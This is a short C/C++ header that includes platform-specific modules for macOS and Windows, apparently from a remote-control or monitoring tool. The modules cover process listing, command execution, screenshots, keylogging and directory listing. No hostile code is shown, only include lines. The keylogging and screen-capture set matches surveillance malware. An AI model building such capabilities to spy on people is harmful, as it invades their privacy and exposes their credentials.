#pragma once
#ifdef __APPLE__
    #include "function_Unix/ListProcesses.h"
    #include "function_Unix/AppCMD.h"
    #include "function_Unix/Screenshot.h"
    #include "function_Unix/Keylog.h"
    #include "function_Unix/ListDirTree.h"
#elif _WIN32
    #include "function_Windows/ListProcesses.h"
    #include "function_Windows/AppCMD.h"
    #include "function_Windows/Screenshot.h"
    #include "function_Windows/Keylog.h"
    #include "function_Windows/ListDirTree.h"
#endif